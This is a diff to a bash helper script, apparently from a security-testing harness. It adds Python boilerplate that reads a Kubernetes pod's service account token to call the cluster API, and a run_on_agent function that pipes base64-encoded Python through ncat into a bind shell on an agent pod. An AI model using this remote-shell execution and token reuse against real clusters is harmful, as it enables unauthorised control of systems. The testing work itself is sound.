@@ -52,3 +52,55 @@ banner() {
   echo "  $1"
   echo "════════════════════════════════════════════════════════════"
 }
+
+# Python boilerplate for k8s API access via SA token + TLS.
+# Prepend to any Python script that needs to talk to the k8s API.
+K8S_API_PREAMBLE='
+import http.client, json, ssl, os, socket, base64, sys
+
+token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
+ctx = ssl.create_default_context(cafile="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
+conn = http.client.HTTPSConnection("kubernetes.default.svc", 443, context=ctx)
+headers = {"Authorization": "Bearer " + token, "Content-Type": "application/json"}
+
+def k8s_get(path):
+    conn.request("GET", path, headers=headers)
+    resp = conn.getresponse()
+    data = resp.read()
+    return json.loads(data) if resp.status == 200 else {"error": resp.status, "body": data.decode()}
+
+def k8s_post(path, body):
+    conn.request("POST", path, body=json.dumps(body), headers=headers)
+    resp = conn.getresponse()
+    data = resp.read()
+    return json.loads(data), resp.status
+
+def k8s_patch(path, body, patch_type="application/json-patch+json"):
+    h = dict(headers)
+    h["Content-Type"] = patch_type
+    conn.request("PATCH", path, body=json.dumps(body), headers=h)
+    resp = conn.getresponse()
+    data = resp.read()
+    return json.loads(data), resp.status
+
+def k8s_delete(path):
+    conn.request("DELETE", path, headers=headers)
+    resp = conn.getresponse()
+    return json.loads(resp.read()), resp.status
+'
+
+# Pipe a Python script through the bind shell on the agent pod.
+# Base64-encodes the code to avoid quoting issues in the shell pipe.
+# Usage: run_on_agent "$python_code"
+run_on_agent() {
+  local python_code="$1"
+  local agent_ip
+  agent_ip=$(resolve_agent_ip)
+  if [[ -z "$agent_ip" || "$agent_ip" == "null" ]]; then
+    echo "ERROR: Could not resolve agent pod IP." >&2
+    return 1
+  fi
+  local b64
+  b64=$(printf '%s' "$python_code" | base64 | tr -d '\n')
+  printf 'echo %s | base64 -d | python3\nexit\n' "$b64" | ncat "$agent_ip" "$BIND_PORT"
+}
